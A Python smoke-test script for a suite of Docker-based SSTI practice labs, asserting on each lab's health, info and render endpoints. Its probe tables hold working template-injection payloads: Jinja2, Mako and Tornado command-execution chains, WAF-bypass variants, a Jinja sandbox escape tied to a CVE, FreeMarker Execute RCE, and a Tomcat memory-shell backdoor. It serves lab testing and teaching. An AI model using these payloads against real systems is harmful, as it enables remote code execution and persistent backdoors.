#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""端到端冒烟验证：把每个靶场容器真的跑起来，用 HTTP 打一遍。

只用标准库（urllib），宿主机任何 Python 3.8+ 都能跑，不需要装 requests。

做法：为每个靶场在**探测端口**上起一个临时容器（不改动默认端口映射），
依次断言：
  * GET /healthz            → 200 "ok"
  * GET /api/lab-info       → JSON，含 id / engine / theme / levels
  * GET /                   → 200，且引用到前端构建产物（assets/）
  * 若该靶场登记了 render 检查，则逐条 POST /api/render 断言输出

用法::

    python scripts/verify_labs.py                 # 全部已构建的靶场
    python scripts/verify_labs.py 02 07           # 只验指定编号
    python scripts/verify_labs.py --keep          # 不删容器，便于手工排查
    python scripts/verify_labs.py --port-base 19500

退出码 0 表示全部通过。
"""

from __future__ import annotations

import argparse
import json
import subprocess
import sys

# --- Windows 控制台默认编码是 GBK，而本脚本会打印 ✅ / ⚠️ 这类字符 -----------
# 不处理的话，即使所有断言都通过，最后一行 print 也会抛 UnicodeEncodeError，
# 脚本以非 0 退出（在 CI 上看起来就是「失败」）。这里强制走 UTF-8。
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, OSError):  # 老解释器 / 已被重定向的流
        pass

import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from urllib.parse import urlencode


@dataclass
class RenderCheck:
    """一条渲染断言。``expect`` 为空表示只要求渲染不抛异常。

    探测默认走 ``god`` 模式：契约里 ``error`` / ``exception_type`` 只在上帝模式返回，
    练习模式看不到异常细节，断言「没有报错」会变成空断言。
    """

    level: str
    template: str
    expect: str = ""
    mode: str = "god"
    note: str = ""
    #: 附加 query 参数（用于 `request.args` 取值的题目，如 lab 02 的 L5/L6）
    query: dict[str, str] = field(default_factory=dict)
    #: 反向断言：期望渲染**抛异常**且异常文本包含该子串（用于记录踩坑点/反例）
    expect_error: str = ""
    #: 反向断言：期望输出中**不出现**该子串（无回显关卡的语义断言：flag 不能泄露）
    expect_absent: str = ""


@dataclass
class RawCheck:
    """对**非** `/api/render` 契约的端点做一次原始 HTTP 断言。

    场景型靶场（lab 07/08）的利用链是「打业务接口」而不是「提交模板给控制台」，
    所以需要一个更通用的探针：请求任意路径，断言响应体内容 / 状态码 / 不应出现的内容。
    """

    path: str
    params: dict[str, str] = field(default_factory=dict)
    method: str = "GET"
    #: 期望响应体包含
    expect: str = ""
    #: 期望响应体**不**包含（用于「无回显」「对照案例」这类反向断言）
    expect_absent: str = ""
    #: 期望的 HTTP 状态码；0 表示只要求 2xx/3xx
    expect_status: int = 0
    note: str = ""


@dataclass
class Lab:
    key: str            # 目录前缀，如 "02"
    name: str           # 目录名
    image: str
    container_port: int = 5000
    probes: list[RenderCheck] = field(default_factory=list)
    #: 非 /api/render 的原始 HTTP 断言（场景型靶场用）
    raw_probes: list[RawCheck] = field(default_factory=list)
    #: 需要 NET_ADMIN（不出网靶场）
    net_admin: bool = False
    #: 该靶场是否提供 /api/render（场景型靶场也提供，见 docs/API.md §5）
    has_render: bool = True
    #: 统一控制台的挂载路径。场景型靶场把业务页面放在 "/"，
    #: 控制台挪到 "/console/"（见 docs/API.md §5）。
    console_path: str = "/"
    #: 启动等待上限（秒）。JVM 系靶场需要更久。
    startup_timeout: float = 60.0
    #: 业务首页路径（默认 "/"）。设为 None 表示跳过该检查。
    home_path: str | None = "/"
    #: 是否要求该靶场的页面引用**统一前端构建产物**（assets/）。
    #: Java 靶场自带静态页，不引用统一前端，所以那里置 False ——
    #: 这样 lab 07 的「控制台必须是统一前端」这条断言不会被削弱。
    console_expect_assets: bool = True


FLAG_TMPL = "flag{verify_%s}"

LABS: list[Lab] = [
    Lab(
        key="01",
        name="01-jinja-waf-fenjing",
        image="ssti-jinja-waf-fenjing:local",
        probes=[
            RenderCheck("0", "{{7*7}}", "49", note="无过滤表达式"),
            RenderCheck("0", "{{ ''.__class__ }}", "WAF", note="命中关键词 __ 被拦（框架统一回 200 + WAF）"),
        ],
    ),
    Lab(
        key="02",
        name="02-jinja-chain",
        image="ssti-jinja-chain:local",
        probes=[
            # ---- L1 无过滤
            RenderCheck("0", "{{7*7}}", "49", note="L1 基础求值"),
            RenderCheck(
                "0",
                "{{lipsum.__globals__.os.popen('cat /flag').read()}}",
                FLAG_TMPL % "02",
                note="L1 经典链读 /flag",
            ),
            # ---- L2 拦截 {{
            RenderCheck("1", "{{7*7}}", "WAF", note="L2 命中 {{ 被拦"),
            RenderCheck("1", "{% print(7*7) %}", "49", note="L2 用 {% %} 绕过"),
            # ---- L3 盲渲染
            RenderCheck("2", "ok", "correct", note="L3 盲关成功 => correct"),
            RenderCheck("2", "{{ 1/0 }}", "wrong", note="L3 盲关异常 => wrong"),
            # ---- L4 禁止方括号
            RenderCheck("3", "{{ 7*7 }}", "49", note="L4 不含方括号则通过"),
            RenderCheck("3", "{{(1,2,3)|first}}", "1", note="L4 用过滤器替代下标"),
            # ---- L5 禁止引号
            RenderCheck("4", "{{7*7}}", "49", note="L5 不含引号应通过"),
            RenderCheck("4", "{{ 'a' }}", "WAF", note="L5 含引号被拦"),
            RenderCheck(
                "4",
                "{{lipsum.__globals__.os.popen(request.args.c).read()}}",
                FLAG_TMPL % "02",
                note="L5 经 request.args 带入字符串，payload 无引号",
                query={"c": "cat /flag"},
            ),
            # ---- L6 禁止下划线（字符 `_`）
            RenderCheck("5", "{{()|attr('__class__')}}", "WAF", note="L6 字面 `_` 被拦"),
            RenderCheck(
                "5",
                "{{lipsum[request.args.a][request.args.b][request.args.c](request.args.d)[request.args.e]()}}",
                FLAG_TMPL % "02",
                note="L6 属性名全部从请求带入，源码无 `_`",
                query={
                    "a": "__globals__", "b": "os", "c": "popen",
                    "d": "cat /flag", "e": "read",
                },
            ),
            RenderCheck(
                "5",
                "{{lipsum['%c%cglobals%c%c'|format(95,95,95,95)]['o'~'s']}}",
                "module 'os'",
                note="L6 用 '%c'|format(95) 运行期造下划线",
            ),
            # ---- L7 禁止点号（下标链；|attr 对 dict 不可用）
            RenderCheck(
                "6",
                "{{lipsum['__globals__']['os']['popen']('cat /flag')['read']()}}",
                FLAG_TMPL % "02",
                note="L7 下标替代点号",
            ),
            RenderCheck(
                "6",
                "{{lipsum|attr('__globals__')|attr('os')|attr('popen')('cat /flag')|attr('read')()}}",
                expect_error="UndefinedError",
                note="L7 反例：|attr 只做 getattr，对 dict 不回退下标 ⇒ 整条链报 UndefinedError",
            ),
            # ---- L8 关键字子串（attr 被禁 ⇒ 不能用 |attr）
            RenderCheck("7", "{{ 'attr' }}", "WAF", note="L8 子串 attr 被拦"),
            RenderCheck(
                "7",
                "{{lipsum['__glo'~'bals__']['o'~'s']['po'~'pen']('cat /flag')['re'~'ad']()}}",
                FLAG_TMPL % "02",
                note="L8 拼接关键字 + 下标",
            ),
            # ---- L10 前缀置空 config/self
            RenderCheck(
                "9",
                "{{lipsum.__globals__.os.popen('cat /flag').read()}}",
                FLAG_TMPL % "02",
                note="L10 前缀置空不影响 lipsum 链",
            ),
        ],
    ),
    Lab(
        key="03",
        name="03-mako-chain",
        image="ssti-mako-chain:local",
        probes=[
            RenderCheck("0", "${7*7}", "49"),
            RenderCheck("0", "${open('/flag').read()}", FLAG_TMPL % "03", note="Mako 直接读文件"),
            RenderCheck("1", "${7*7}", "WAF", note="L2 命中 ${ 被拦"),
            RenderCheck(
                "1",
                "<%!\nimport os\n%><% context.write(os.popen('cat /flag').read()) %>",
                FLAG_TMPL % "03",
                note="L2 用代码块绕过",
            ),
        ],
    ),
    Lab(
        key="04",
        name="04-tornado-chain",
        image="ssti-tornado-chain:local",
        probes=[
            RenderCheck("0", "{{ 7*7 }}", "49"),
            RenderCheck(
                "0",
                "{% import os %}{{ os.popen('cat /flag').read() }}",
                FLAG_TMPL % "04",
                note="Tornado {% import %} 直接 RCE",
            ),
            RenderCheck("1", "{{ 7*7 }}", "WAF", note="L2 命中 {{ 被拦"),
            RenderCheck(
                "1",
                "{% import os %}{% set _ = os.system('true') %}OK",
                "OK",
                note="L2 语句块仍可用（{% import %} 直接导入模块）",
            ),
        ],
    ),
    # 06 的关卡由该靶场自己的 README 与 tests/verify_blind.py 覆盖；
    # 这里只做接口级冒烟，避免把「某条 payload 一定能用」写死在公共脚本里造成脆弱耦合。
    Lab(
        key="05",
        name="05-jinja-sandbox",
        image="ssti-jinja-sandbox:local",
        probes=[
            # 经典链在 3.1.4/3.1.5/3.1.6 上都该失败 —— 用反向断言把它钉住
            RenderCheck(
                "0",
                "{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}",
                expect_error="UndefinedError",
                note="L1 教科书经典链应失败（2.11.3 起 |attr 受沙箱检查）",
            ),
            RenderCheck("0", "{{ ''.__class__ }}", "", note="L1 点号取魔术属性应拿不到（渲染成空串）"),
            RenderCheck(
                "0",
                "{{ ('{0.__globals__[SITEDATA][flag]}'|attr('format'))(helper) }}",
                FLAG_TMPL % "05",
                note="L1 CVE-2025-27516 原语读出内存里的 flag",
            ),
            RenderCheck(
                "1",
                "{{ [1,2,3].append(4) }}",
                expect_error="SecurityError",
                note="L2 immutable 沙箱禁止修改可变对象",
            ),
            RenderCheck(
                "1",
                "{{ ('{0.__globals__[SITEDATA][flag]}'|attr('format'))(helper) }}",
                FLAG_TMPL % "05",
                note="L2 同一原语在 immutable 下照样成立",
            ),
            RenderCheck("2", "{{ 'format' }}", "WAF", note="L3 字面关键字被拦"),
            RenderCheck(
                "2",
                "{{ (('{0.__glo'~'bals__[SITEDATA][fl'~'ag]}')|attr('for'~'mat'))(helper) }}",
                FLAG_TMPL % "05",
                note="L3 拆分关键字 + 整体加括号（| 优先级高于 ~）",
            ),
            RenderCheck("3", "{{ '__globals__' }}", "WAF", note="L4 字面下划线被拦"),
            RenderCheck(
                "3",
                "{{ (('{0.'~('%c'|format(95))~('%c'|format(95))~'globals'~('%c'|format(95))"
                "~('%c'|format(95))~'[SITEDATA][flag]}')|attr('format'))(helper) }}",
                FLAG_TMPL % "05",
                note="L4 用 '%c'|format(95) 运行期造下划线",
            ),
        ],
    ),
    # 06 的**完整信道验证**（二分盲注实际还原 flag、时间信道统计、写文件回显取回）
    # 在 tests/verify_blind.py 里；这里只做接口级冒烟，避免公共脚本依赖多步交互。
    Lab(
        key="06",
        name="06-blind-ssti",
        image="ssti-blind:local",
        probes=[
            RenderCheck("0", "ok", "correct", note="L1 布尔盲注：成功 => correct"),
            RenderCheck("0", "{{ 1/0 }}", "wrong", note="L1 布尔盲注：异常 => wrong"),
            RenderCheck("0", "{{ secret }}", "correct", note="L1 直接打印 secret 也拿不到内容（只回 correct）"),
            RenderCheck("1", "ok", "received", note="L2 时间盲注：响应体恒为常量"),
            RenderCheck(
                "2", "ok", expect_absent=FLAG_TMPL % "06",
                note="L3 写文件回显：响应体不回显 flag（flag 要经 /echo/ 取回）",
            ),
            RenderCheck(
                "3", "ok", expect_absent=FLAG_TMPL % "06",
                note="L4 不出网桥接关：响应体不回显 flag",
            ),
        ],
    ),
    Lab(
        key="07",
        name="07-flask-memshell",
        image="ssti-flask-memshell:local",
        net_admin=True,
        console_path="/console/",
        probes=[
            RenderCheck("0", "{{7*7}}", "49", note="控制台调试台（有回显）"),
            RenderCheck("0", "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
                        FLAG_TMPL % "07", note="cycler 链读 /flag"),
        ],
    ),
    Lab(
        key="08",
        name="08-freemarker-memshell",
        image="ssti-freemarker-memshell:local",
        container_port=8080,
        net_admin=True,
        has_render=False,
        startup_timeout=180.0,
        console_expect_assets=False,
        raw_probes=[
            RawCheck(
                "/theme/preview", {"template": "${7*7}"}, expect="49",
                note="FreeMarker 求值：确认 ${{...}} 是注入点",
            ),
            RawCheck(
                "/theme/preview",
                {"template": '${"freemarker.template.utility.Execute"?new()("id")}'},
                expect="uid=",
                note="UNRESTRICTED 类解析器 ⇒ 任意 Java 代码执行",
            ),
            RawCheck(
                "/theme/preview",
                {"template": '${"com.lab.themepreview.memshell.InjectHelper"?new(servletContext)()}'},
                expect="filterStart=true",
                note="把 Tomcat Filter 动态注册进运行中的 StandardContext",
            ),
            RawCheck(
                "/memshell", {"cmd": "cat /flag"}, expect=FLAG_TMPL % "08",
                note="经内存马读 /flag（全程不出网）",
            ),
            RawCheck(
                "/memshell", {"b64cmd": "Y2F0IC9mbGFn"}, expect=FLAG_TMPL % "08",
                note="base64 变体（便于投递含引号/管道的命令）",
            ),
            RawCheck(
                "/memshell", expect_status=404,
                note="不携带 cmd 时 Filter 原样放行（隐蔽性要求）",
            ),
            RawCheck(
                "/theme/thymeleaf", {"theme": "__${7*7}__"},
                expect_status=500, expect_absent="49",
                note="对照案例：Thymeleaf 模板名在本栈上不求值（500=视图名找不到，且响应里没有 49）",
            ),
        ],
    ),
]


# ---------------------------------------------------------------------------
def run(cmd: list[str], *, check: bool = False) -> subprocess.CompletedProcess[str]:
    # 显式指定 utf-8：容器日志/输出是 UTF-8，而中文 Windows 的 locale 是 GBK，
    # 不指定会让 subprocess 在读管道时抛 UnicodeDecodeError。
    return subprocess.run(
        cmd, capture_output=True, text=True, encoding="utf-8", errors="replace", check=check
    )


def image_exists(image: str) -> bool:
    return run(["docker", "image", "inspect", image]).returncode == 0


def http(url: str, *, method: str = "GET", body: dict | None = None, timeout: float = 8.0):
    data = None
    # ⚠️ 不要写死 `Accept: application/json`：Spring 的内容协商会据 Accept 选表示，
    #    而 `/healthz` 只产出 text/plain —— 于是 406 Not Acceptable。
    #    用 `*/*` 让服务端自己决定，响应体照样能按 JSON 解析（api/* 都显式声明了 JSON）。
    headers = {"Accept": "*/*"}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read().decode("utf-8", "replace")
        return resp.status, raw


def wait_healthy(port: int, container: str, timeout: float = 60.0) -> tuple[bool, str]:
    """轮询 /healthz；容器中途退出则立刻返回失败并带上日志。"""
    deadline = time.time() + timeout
    last = ""
    while time.time() < deadline:
        state = run(["docker", "inspect", "-f", "{{.State.Running}}", container]).stdout.strip()
        if state != "true":
            logs = run(["docker", "logs", container]).stdout + run(["docker", "logs", container]).stderr
            return False, f"容器已退出。日志尾部：\n{logs[-1500:]}"
        try:
            status, raw = http(f"http://127.0.0.1:{port}/healthz", timeout=3)
            if status == 200:
                return True, raw
        except Exception as exc:  # noqa: BLE001
            last = f"{type(exc).__name__}: {exc}"
        time.sleep(1.5)
    return False, f"/healthz 超时。最后一次错误：{last}"


class Reporter:
    def __init__(self) -> None:
        self.passed = 0
        self.failed: list[str] = []
        self.skipped: list[str] = []

    def ok(self, label: str) -> None:
        self.passed += 1
        print(f"    ok    {label}")

    def bad(self, label: str, detail: str = "") -> None:
        self.failed.append(label)
        print(f"    FAIL  {label}")
        if detail:
            print(f"          {detail.strip()[:600]}")

    def skip(self, label: str, why: str) -> None:
        self.skipped.append(label)
        print(f"    skip  {label} —— {why}")


def verify_lab(lab: Lab, port: int, rep: Reporter, *, keep: bool) -> None:
    print(f"\n{'=' * 72}\n[{lab.key}] {lab.name}  (镜像 {lab.image}, 探测端口 {port})\n{'=' * 72}")

    if not image_exists(lab.image):
        rep.skip(lab.name, f"镜像不存在：{lab.image}（先跑 scripts/build-all）")
        return

    container = f"ssti-verify-{lab.key}"
    run(["docker", "rm", "-f", container])

    cmd = ["docker", "run", "-d", "--name", container, "-p", f"{port}:{lab.container_port}"]
    if lab.net_admin:
        cmd += ["--cap-add", "NET_ADMIN"]
    cmd += ["-e", f"STATIC_FLAG={FLAG_TMPL % lab.key}", lab.image]
    res = run(cmd)
    if res.returncode != 0:
        rep.bad(f"{lab.name} 启动容器", res.stderr)
        return

    try:
        healthy, detail = wait_healthy(port, container, timeout=lab.startup_timeout)
        if not healthy:
            rep.bad(f"{lab.name} /healthz", detail)
            return
        rep.ok("/healthz → 200 ok")

        # ---- /api/lab-info -------------------------------------------------
        try:
            status, raw = http(f"http://127.0.0.1:{port}/api/lab-info")
            info = json.loads(raw)
        except Exception as exc:  # noqa: BLE001
            rep.bad(f"{lab.name} /api/lab-info", f"{type(exc).__name__}: {exc}")
            return
        missing = [k for k in ("id", "title", "engine", "levels", "theme", "no_egress") if k not in info]
        if missing:
            rep.bad("/api/lab-info 字段完整", f"缺字段 {missing}")
        else:
            rep.ok(f"/api/lab-info → id={info['id']} levels={len(info['levels'])} "
                   f"no_egress={info['no_egress']}")

        # ---- 前端 / 控制台 --------------------------------------------------
        try:
            status, html = http(f"http://127.0.0.1:{port}{lab.console_path}")
            where = "GET /" if lab.console_path == "/" else f"GET {lab.console_path}（控制台）"
            if not lab.console_expect_assets:
                rep.ok(f"{where} → 200（该靶场自带页面）") if status == 200 else rep.bad(where, f"status={status}")
            elif status == 200 and "assets/" in html:
                rep.ok(f"{where} → 200 且引用前端构建产物")
            elif status == 200:
                rep.bad(where, "200 但未见 assets/（可能回退到了内置降级控制台？）")
            else:
                rep.bad(where, f"status={status}")
        except Exception as exc:  # noqa: BLE001
            rep.bad(f"GET {lab.console_path}", f"{type(exc).__name__}: {exc}")

        # 场景型靶场额外确认业务首页可用
        if lab.console_path != "/" and lab.home_path:
            try:
                status, html = http(f"http://127.0.0.1:{port}{lab.home_path}")
                if status == 200 and html.strip():
                    rep.ok(f"GET {lab.home_path} → 200（业务首页）")
                else:
                    rep.bad(f"GET {lab.home_path}（业务首页）", f"status={status}")
            except Exception as exc:  # noqa: BLE001
                rep.bad(f"GET {lab.home_path}（业务首页）", f"{type(exc).__name__}: {exc}")

        # ---- flag 不可从镜像层读出（抽查容器内确实存在） --------------------
        flag = FLAG_TMPL % lab.key
        cat = run(["docker", "exec", container, "cat", "/flag"])
        if cat.returncode == 0 and cat.stdout.strip() == flag:
            rep.ok("/flag 由 entrypoint 正确写入")
        else:
            rep.bad("/flag 内容", f"rc={cat.returncode} out={cat.stdout!r} err={cat.stderr!r}")

        # ---- render 断言（控制台型靶场） ------------------------------------
        if not lab.has_render:
            rep.skip("render 检查", "该靶场不实现 /api/render 契约")
            _run_raw_probes(lab, port, rep)
            return
        for check in lab.probes:
            body = {"level": check.level, "template": check.template, "mode": check.mode}
            url = f"http://127.0.0.1:{port}/api/render"
            if check.query:
                url += "?" + urlencode(check.query)
            try:
                status, raw = http(url, method="POST", body=body)
                payload = json.loads(raw)
            except urllib.error.HTTPError as exc:
                rep.bad(f"L{check.level} render [{(check.note or check.template)[:40]}]",
                        f"HTTP {exc.code}")
                continue
            except Exception as exc:  # noqa: BLE001
                rep.bad(f"L{check.level} render [{(check.note or check.template)[:40]}]",
                        f"{type(exc).__name__}: {exc}")
                continue

            out = str(payload.get("output", ""))
            err = str(payload.get("error") or "")
            label = f"L{check.level} {(check.note or check.template)[:52]}"

            if check.expect_error:
                # 反向断言：必须抛异常，且异常文本符合预期
                if check.expect_error in err:
                    rep.ok(f"{label} → 如期抛 {check.expect_error}")
                else:
                    rep.bad(label, f"期望异常含 {check.expect_error!r}，实际 error={err[:200]!r} "
                                   f"output={out[:200]!r}")
                continue

            problems: list[str] = []
            if check.expect and check.expect not in out:
                problems.append(f"期望含 {check.expect!r}")
            if check.expect_absent and check.expect_absent in out:
                problems.append(f"期望不含 {check.expect_absent!r}（无回显关卡不应泄露）")
            if not check.expect and not check.expect_absent and payload.get("error") is not None:
                problems.append(f"期望渲染无异常，实际 error={err[:160]!r}")

            if problems:
                rep.bad(label, "；".join(problems) + f"（实际 output={out[:200]!r}）")
            else:
                shown = repr(check.expect) if check.expect else (
                    f"不含 {check.expect_absent!r}" if check.expect_absent else f"{out[:40]!r}"
                )
                rep.ok(f"{label} → {shown}")

        # ---- 原始 HTTP 断言（场景型靶场的业务链路） --------------------------
        _run_raw_probes(lab, port, rep)
    finally:
        if keep:
            print(f"    (--keep) 容器保留：{container}")
        else:
            run(["docker", "rm", "-f", container])


def _run_raw_probes(lab: Lab, port: int, rep: Reporter) -> None:
    """跑 `Lab.raw_probes`：任意路径 + 任意方法，断言内容 / 状态码。"""
    for rc in lab.raw_probes:
        url = f"http://127.0.0.1:{port}{rc.path}"
        if rc.params:
            url += "?" + urlencode(rc.params)
        label = f"{rc.method} {rc.path} {(rc.note or '')[:46]}"
        try:
            status, raw = http(url, method=rc.method)
        except urllib.error.HTTPError as exc:
            # 期望非 2xx（例如「不带 cmd 时应当 404」）会走到这里
            body = exc.read().decode("utf-8", "replace") if hasattr(exc, "read") else ""
            if rc.expect_status and exc.code == rc.expect_status:
                rep.ok(f"{label} → 如期 {exc.code}")
            else:
                rep.bad(label, f"HTTP {exc.code}（期望 {rc.expect_status or '2xx'}）")
            continue
        except Exception as exc:  # noqa: BLE001
            rep.bad(label, f"{type(exc).__name__}: {exc}")
            continue

        problems: list[str] = []
        if rc.expect_status and status != rc.expect_status:
            problems.append(f"期望状态码 {rc.expect_status}，实际 {status}")
        if not rc.expect_status and not (200 <= status < 400):
            problems.append(f"期望 2xx/3xx，实际 {status}")
        if rc.expect and rc.expect not in raw:
            problems.append(f"期望含 {rc.expect!r}")
        if rc.expect_absent and rc.expect_absent in raw:
            problems.append(f"期望不含 {rc.expect_absent!r}")
        if problems:
            rep.bad(label, "；".join(problems) + f"（body={raw[:200]!r}）")
        else:
            shown = (repr(rc.expect) if rc.expect
                     else f"不含 {rc.expect_absent!r}" if rc.expect_absent
                     else f"status={status}")
            rep.ok(f"{label} → {shown}")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="SSTI 靶场端到端冒烟验证")
    parser.add_argument("keys", nargs="*", help="只验指定编号，如 02 07")
    parser.add_argument("--keep", action="store_true", help="保留容器便于排查")
    parser.add_argument("--port-base", type=int, default=19100, help="探测端口起点（默认 19100）")
    args = parser.parse_args(argv)

    if run(["docker", "version", "--format", "{{.Server.Version}}"]).returncode != 0:
        print("Docker 不可用：请先启动 Docker Desktop / dockerd", file=sys.stderr)
        return 2

    targets = [l for l in LABS if not args.keys or l.key in args.keys]
    if not targets:
        print(f"未匹配到靶场：{args.keys}", file=sys.stderr)
        return 2

    rep = Reporter()
    for i, lab in enumerate(targets):
        verify_lab(lab, args.port_base + i, rep, keep=args.keep)

    print(f"\n{'=' * 72}")
    print(f"通过 {rep.passed} 项，失败 {len(rep.failed)} 项，跳过 {len(rep.skipped)} 个靶场")
    if rep.skipped:
        print("跳过：" + "; ".join(rep.skipped))
    if rep.failed:
        print("失败项：")
        for f in rep.failed:
            print(f"  - {f}")
        return 1
    print("全部通过 ✅")
    return 0


if __name__ == "__main__":
    sys.exit(main())
